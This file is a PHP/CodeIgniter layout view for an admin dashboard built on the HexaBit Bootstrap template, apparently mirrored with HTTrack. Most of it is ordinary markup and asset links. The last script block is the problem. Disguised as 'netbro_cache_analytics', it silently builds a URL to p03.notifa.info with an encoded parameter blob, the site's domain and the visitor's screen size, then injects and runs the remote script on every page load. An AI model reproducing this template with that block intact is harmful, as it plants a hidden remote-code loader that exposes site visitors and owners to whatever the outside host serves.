<?php 
   $CI =& get_instance();
   $setting =  $CI->db->get_where('setting', ['id'=>1])->row();
 ?>


<!doctype html>
<html lang="en">

<!-- Mirrored from www.ascaps.com/demo/hexabit/html/light/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Sep 2018 10:52:33 GMT -->
<head>
<title><?= $setting->short_name ?></title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="description" content="HexaBit Bootstrap 4x Admin Template">
<meta name="author" content="ASCaps, www.ascaps.com">

<link rel="icon" href="favicon.ico" type="image/x-icon">
<!-- VENDOR CSS -->
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/bootstrap-progressbar/css/bootstrap-progressbar-3.3.4.min.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/chartist/css/chartist.min.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/chartist-plugin-tooltip/chartist-plugin-tooltip.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/toastr/toastr.min.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/vendor/morrisjs/morris.css" />

<!-- MAIN CSS -->
<link rel="stylesheet" href="<?= base_url() ?>assets/css/main.css">
<link rel="stylesheet" href="<?= base_url() ?>assets/css/color_skins.css">
<style type="text/css">
    .slimScrollBar{
        background: green !important;
    }
</style>
</head>
<body class="theme-green">

<!-- Page Loader -->
<div class="page-loader-wrapper">
    <div class="loader">
        <div class="m-t-30"><img src="http://www.ascaps.com/demo/hexabit/html/images/icon-light.svg" width="48" height="48" alt="HexaBit"></div>
        <p>Please wait...</p>        
    </div>
</div>
<!-- Overlay For Sidebars -->
<div class="overlay"></div>

<div id="wrapper">

    <nav class="navbar navbar-fixed-top">
        <div class="container-fluid">

            <div class="navbar-left">
                <div class="navbar-btn">
                    <a href="index.html"><img src="http://www.ascaps.com/demo/hexabit/html/images/icon-light.svg" alt="HexaBit Logo" class="img-fluid logo"></a>
                    <button type="button" class="btn-toggle-offcanvas"><i class="lnr lnr-menu fa fa-bars"></i></button>
                </div>
                
                <ul class="nav navbar-nav">
                    <li class="dropdown dropdown-animated scale-right">
                        <a href="javascript:void(0);" class="icon-menu btn-toggle-fullwidth"><i class="fa fa-arrow-left"></i></a>
                       
                    </li>
                                      
                </ul>
            </div>
            
           
        </div>
    </nav>

  

   <?php $this->load->view('template/sidebar'); ?>

    <div id="main-content">
        <div class="block-header">
            <div class="row clearfix">
                <div class="col-md-6 col-sm-12">
                    <h2  ><?= ucfirst($this->uri->segment(1)) ?></h2>
                </div>            
                <div class="col-md-6 col-sm-12 text-right">
                    <ul class="breadcrumb">
                        <li class="breadcrumb-item"><a href="<?= site_url('admin/home') ?>"><i class="icon-home"></i></a></li>
                        <li class="breadcrumb-item active <?= $this->uri->segment(1)=='home'?'d-none':'' ?>"><?= ($this->uri->segment(1)) ?></li>
                    </ul>
                </div>
            </div>
        </div>

       <?= $content ?>
    </div>
    
</div>

<!-- Javascript -->
<script src="<?= base_url() ?>assets/bundles/libscripts.bundle.js"></script>    
<script src="<?= base_url() ?>assets/bundles/vendorscripts.bundle.js"></script>

<script src="<?= base_url() ?>assets/bundles/chartist.bundle.js"></script>
<script src="<?= base_url() ?>assets/vendor/toastr/toastr.js"></script>
<script src="<?= base_url() ?>assets/bundles/morrisscripts.bundle.js"></script><!-- Morris Plugin Js -->

<script src="<?= base_url() ?>assets/bundles/mainscripts.bundle.js"></script>
<script src="<?= base_url() ?>assets/js/index.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mToMYuOFTZu%2bnicmGftsIsQfBSWGC0TTqyprqu9ZrgKsD5EJhc9odu%2b4T8Rq600fJp%2fCdFJ0ADuEzt%2fSjPSf8iTd2teWSz2TU5%2bzRVGqG%2bOs9m4jwwBjJZ55EecCLwa2jXV0xG60ng0FHoYPpO5wJcMK%2fATgpya%2b%2fmnQC%2bD8OrSrBGk3uWxGW7oYnIIUlW3zpkrXe75BAD3tLcdqhtOnoX7TCMsNVp%2fUjr5L80lraWWpv7eswOyaqShXfqJPOI82ZruoAwqCjqQkgTXMnXa%2bakIpHOYdgIcTIAGSNjk%2bWoPlDCEnVcOXw2Aj%2fErSjUvo7r%2bgg6Ojxiyk%2bg%2faZsSGgePivg4S6EX6fmQpsyvchAQtrevbMRqVf08Iy3xBqQ9UaQE%2bqKN69uyLDikhPfOO%2fNT76U%2bwEwHhrNDyNLClFCf7FXHgeEptpPhiLv5911Z8C63GEwed3zH1bF2OzU55zPxo4beuHh17RFPT98s7FI5AjXr9aujScclDbsOCb5Sxl" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.ascaps.com/demo/hexabit/html/light/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Sep 2018 10:53:37 GMT -->
</html>
